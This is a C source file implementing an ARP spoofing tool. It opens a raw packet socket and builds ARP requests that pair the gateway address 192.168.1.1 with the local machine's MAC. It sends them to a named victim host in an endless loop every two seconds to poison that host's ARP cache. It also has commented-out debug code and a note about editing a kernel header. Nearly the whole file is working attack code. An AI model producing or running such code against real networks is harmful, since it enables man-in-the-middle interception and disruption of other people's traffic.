#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define err(msg) \
	do{ perror(msg); exit(1); }while(0);


#define BUFSIZE 100
unsigned char broadcast_haddr[] = {0xff,0xff,0xff,0xff,0xff,0xff};
unsigned char target_haddr[] = {0x4c,0xeb,0x42,0x7d,0xe1,0x9b};
unsigned char local_haddr[] = {0x08,0x00,0x27,0xbf,0xed,0x99};
char *victim_ip = "192.168.1.123"; 
char *spoof_ip = "192.168.1.1";

int main()
{
	int ps,i, n;
	char *s = "Hello World\n";
	char *eth = "eth0";
	unsigned char buf[BUFSIZE];
	struct ether_arp req;
	struct ifreq ifr;
	struct arphdr *arp;
	struct sockaddr_ll lladdr;
	int addrlen;


	if( (ps = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP))) < 0)
		err("socket error");

	memcpy(ifr.ifr_name, eth, sizeof(eth));
	if(ioctl(ps, SIOCGIFINDEX, &ifr) == -1)
		err("ioctl error");

	bzero(&lladdr, sizeof(lladdr));
	lladdr.sll_family = AF_PACKET;
	lladdr.sll_ifindex = ifr.ifr_ifindex;
	lladdr.sll_protocol = htons(ETH_P_ARP);
	memcpy(lladdr.sll_addr, target_haddr, ETHER_ADDR_LEN);
	lladdr.sll_halen = ETHER_ADDR_LEN;

/*
	if(write(ps, s, strlen(s)) < 0)
		err("write error");

*/


/*
	if( (n = recvfrom(ps, buf, sizeof(buf), 0, 
						(struct sockaddr *)&lladdr, &addrlen)) < 0)
		err("recvfrom error");

	if( (n = read(ps, buf, sizeof(buf))) < 0)
		err("read error");

	arp = (struct arphdr *)buf;
	printf("Hardware type %.4x\n", arp->ar_hrd);
	printf("Protocol tpe %.4x\n", arp->ar_pro);
	printf("Hardware size: %x\n", arp->ar_hln);
	printf("Protocol size: %x\n", arp->ar_pln);
	printf("Opcose: %.4x\n", arp->ar_op);


	printf("\n\n");
	for(i = 0; i < 8; i++)
		printf("%.2x ", lladdr.sll_addr[i]);
	printf("\n\n");
	for(i=0 ; i<n; i++)
		printf("%.2x ",buf[i]);

	printf("\n");
*/


//construct arp packet
	bzero(&req, sizeof(req));
	req.arp_hrd = htons(ARPHRD_ETHER);
	req.arp_pro = htons(ETH_P_IP);
	req.arp_hln = ETHER_ADDR_LEN;
	req.arp_pln = sizeof(in_addr_t);
	req.arp_op  = htons(ARPOP_REQUEST);

	struct in_addr ipaddr;
	if(!inet_aton(spoof_ip, &ipaddr))
		err("inet_aton error");
	memcpy(&req.arp_spa, &ipaddr.s_addr, sizeof(req.arp_spa));
	
	if(!inet_aton(victim_ip, &ipaddr))
		err("inet_aton error");
	memcpy(&req.arp_tpa, &ipaddr.s_addr, sizeof(req.arp_spa));

	memcpy(req.arp_sha, local_haddr, ETHER_ADDR_LEN);
	memset(req.arp_tha, '\0', ETHER_ADDR_LEN);


	while(1){
		if(sendto(ps, &req, sizeof(req), 0, 
					(struct sockaddr *)&lladdr, sizeof(lladdr)) < 0)
			err("sendto error");
		printf("send ok\n");
		sleep(2);
	}

	exit(0);

}

/**
	if want to use this 
		should change /usr/include/linux/if_arp.h #line 148  '0' to '1'
	
	if(arp->ar_sha) 
		printf("GOOD\n");
*/


